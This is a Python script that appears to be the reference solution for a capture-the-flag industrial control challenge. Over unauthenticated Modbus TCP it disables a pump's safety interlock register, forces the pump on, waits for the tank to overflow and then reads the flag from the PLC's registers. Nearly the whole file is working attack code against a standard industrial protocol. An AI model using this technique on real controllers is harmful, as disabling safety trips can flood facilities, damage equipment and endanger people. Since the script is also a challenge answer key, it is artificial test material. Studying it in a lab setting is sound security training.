#!/usr/bin/env python3
"""
Reference exploit for the Pump Station 4 ICS challenge.

Implements just enough of the Modbus TCP client side (raw sockets +
struct, no pymodbus dependency) to demonstrate the attack:

  1. Connect to the PLC's Modbus port. No login, no handshake — the
     protocol simply doesn't have one.
  2. Write register 3 (interlock_enabled) = 0, disabling the safety trip
     that's supposed to stop the pump once the tank is full.
  3. Write register 1 (pump_on) = 1, making sure the pump is running.
  4. Poll register 0 (level) and register 4 (overflow_flag) until the
     tank overflows.
  5. Read the flag back out of the PLC's own holding registers
     (length in reg 99, ASCII bytes starting at reg 100) — the flag is
     retrieved the same way any other process value would be, over the
     same unauthenticated protocol.
"""
import socket
import struct
import sys
import time

HOST = "127.0.0.1"
PORT = 5020


class ModbusClient:
    def __init__(self, host, port):
        self.sock = socket.create_connection((host, port), timeout=5)
        self.tx_id = 0

    def _txn(self, func_and_data: bytes) -> bytes:
        self.tx_id = (self.tx_id + 1) & 0xFFFF
        mbap = struct.pack(">HHHB", self.tx_id, 0, len(func_and_data) + 1, 1)
        self.sock.sendall(mbap + func_and_data)
        header = self._recvall(7)
        _, _, length, _ = struct.unpack(">HHHB", header)
        return self._recvall(length - 1)

    def _recvall(self, n):
        buf = b""
        while len(buf) < n:
            chunk = self.sock.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("connection closed")
            buf += chunk
        return buf

    def read_holding_registers(self, start: int, qty: int):
        resp = self._txn(bytes([0x03]) + struct.pack(">HH", start, qty))
        if resp[0] != 0x03:
            raise RuntimeError(f"Modbus exception on read: {resp.hex()}")
        count = resp[1]
        return list(struct.unpack(f">{count // 2}H", resp[2:2 + count]))

    def write_single_register(self, addr: int, value: int):
        resp = self._txn(bytes([0x06]) + struct.pack(">HH", addr, value))
        if resp[0] != 0x06:
            raise RuntimeError(f"Modbus exception on write: {resp.hex()}")


def main():
    c = ModbusClient(HOST, PORT)

    level0, = c.read_holding_registers(0, 1)
    print(f"[*] current tank level: {level0 / 10:.1f}%")

    print("[*] writing reg 3 (interlock_enabled) = 0 ...")
    c.write_single_register(3, 0)

    print("[*] writing reg 1 (pump_on) = 1 ...")
    c.write_single_register(1, 1)

    print("[*] waiting for overflow ...")
    for _ in range(120):
        level, overflow = c.read_holding_registers(0, 1)[0], c.read_holding_registers(4, 1)[0]
        print(f"    level={level / 10:5.1f}%  overflow={overflow}", end="\r")
        if overflow:
            print()
            break
        time.sleep(0.5)
    else:
        print("\n[!] timed out waiting for overflow", file=sys.stderr)
        sys.exit(1)

    flag_len, = c.read_holding_registers(99, 1)
    flag_regs = c.read_holding_registers(100, flag_len)
    flag = bytes(flag_regs).decode()
    print(f"[+] flag: {flag}")


if __name__ == "__main__":
    main()
